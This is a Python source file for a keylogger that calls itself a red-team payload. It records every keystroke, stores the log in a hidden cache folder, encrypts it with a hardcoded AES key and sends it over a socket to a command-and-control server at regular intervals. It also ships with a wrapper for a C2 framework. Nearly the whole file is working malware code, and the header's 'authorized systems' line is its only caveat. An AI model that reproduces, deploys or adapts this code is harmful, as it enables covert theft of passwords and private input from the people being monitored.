#!/usr/bin/env python3
"""
PAYLOAD: Keystroke Logger
DESCRIPTION: Logs keystrokes and exfiltrates them to C2
AUTHOR: Rogue Red Team
VERSION: 2.0
SECURITY: This tool logs sensitive input - Use only on authorized systems
"""
import os, sys, time, json, threading, datetime, socket, base64, hashlib
from pynput import keyboard
from Cryptodome.Cipher import AES

class KeyLogger:
    def __init__(self, exfil_interval=60, c2_host=None, c2_port=9091):
        self.log = []
        self.running = False
        self.exfil_interval = exfil_interval
        self.c2_host = c2_host or self.get_default_c2()
        self.c2_port = c2_port
        self.encryption_key = hashlib.sha256(b'RogueKeyLogger2024').digest()
        self.output_dir = os.path.expanduser("~/.cache/.rogue/keylogs")
        os.makedirs(self.output_dir, exist_ok=True)
        
    def get_default_c2(self):
        """Get C2 host from environment or default"""
        return os.environ.get('ROGUE_C2_HOST', 'localhost')
    
    def on_press(self, key):
        """Callback for key press"""
        try:
            key_str = key.char
        except AttributeError:
            if key == keyboard.Key.space:
                key_str = ' '
            elif key == keyboard.Key.enter:
                key_str = '\n'
            elif key == keyboard.Key.tab:
                key_str = '\t'
            elif key == keyboard.Key.backspace:
                key_str = '[BACKSPACE]'
            elif key == keyboard.Key.esc:
                key_str = '[ESC]'
            else:
                key_str = f'[{key.name}]'
        
        timestamp = datetime.datetime.now().isoformat()
        log_entry = {
            "timestamp": timestamp,
            "key": key_str,
            "event": "press"
        }
        
        self.log.append(log_entry)
        
        # Write to local file as backup
        self.write_to_local(log_entry)
    
    def write_to_local(self, entry):
        """Write log entry to local file"""
        log_file = os.path.join(self.output_dir, f"keylog_{datetime.datetime.now().strftime('%Y%m%d')}.log")
        with open(log_file, 'a') as f:
            f.write(f"{entry['timestamp']} - {entry['key']}\n")
    
    def encrypt_logs(self, data):
        """Encrypt log data for exfiltration"""
        cipher = AES.new(self.encryption_key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(json.dumps(data).encode())
        encrypted = cipher.nonce + tag + ciphertext
        return base64.b64encode(encrypted).decode()
    
    def exfil_logs(self):
        """Exfiltrate logs to C2 server"""
        if not self.log:
            return
        
        # Take a copy of current logs and clear
        logs_to_send = self.log.copy()
        self.log.clear()
        
        try:
            encrypted_data = self.encrypt_logs(logs_to_send)
            
            # Send to C2
            s = socket.socket()
            s.connect((self.c2_host, self.c2_port))
            s.sendall(encrypted_data.encode())
            s.close()
            
            print(f"[+] Exfiltrated {len(logs_to_send)} keystrokes to {self.c2_host}:{self.c2_port}")
            
        except Exception as e:
            print(f"[!] Exfiltration failed: {e}")
            # Restore logs if exfiltration failed
            self.log = logs_to_send + self.log
    
    def start_exfiltration_thread(self):
        """Start thread for periodic exfiltration"""
        def exfil_loop():
            while self.running:
                time.sleep(self.exfil_interval)
                self.exfil_logs()
        
        thread = threading.Thread(target=exfil_loop, daemon=True)
        thread.start()
    
    def start(self):
        """Start the keylogger"""
        print(f"[+] Starting keylogger. Exfiltration to {self.c2_host}:{self.c2_port} every {self.exfil_interval}s")
        print(f"[+] Local logs stored in: {self.output_dir}")
        print("[+] Press Ctrl+C to stop")
        
        self.running = True
        self.start_exfiltration_thread()
        
        try:
            with keyboard.Listener(on_press=self.on_press) as listener:
                listener.join()
        except KeyboardInterrupt:
            print("[+] Stopping keylogger...")
        finally:
            self.stop()
    
    def stop(self):
        """Stop the keylogger"""
        self.running = False
        # Final exfiltration
        self.exfil_logs()
        print("[+] Keylogger stopped")

def rogue_integration():
    """Wrapper for Rogue C2 integration"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Rogue Keylogger')
    parser.add_argument('--interval', type=int, default=60, help='Exfiltration interval in seconds')
    parser.add_argument('--c2-host', help='C2 server hostname')
    parser.add_argument('--c2-port', type=int, default=9091, help='C2 server port')
    
    args, unknown = parser.parse_known_args()
    
    # Check if we're being called from Rogue with arguments
    if len(sys.argv) > 1 and sys.argv[1] == '--rogue-integration':
        # Parse Rogue-style arguments
        args.interval = 60
        args.c2_host = None
    
    keylogger = KeyLogger(
        exfil_interval=args.interval,
        c2_host=args.c2_host,
        c2_port=args.c2_port
    )
    
    try:
        keylogger.start()
        return "[+] Keylogger started successfully"
    except Exception as e:
        return f"[!] Keylogger failed to start: {e}"

if __name__ == "__main__":
    # When run directly, start the keylogger
    keylogger = KeyLogger()
    keylogger.start()
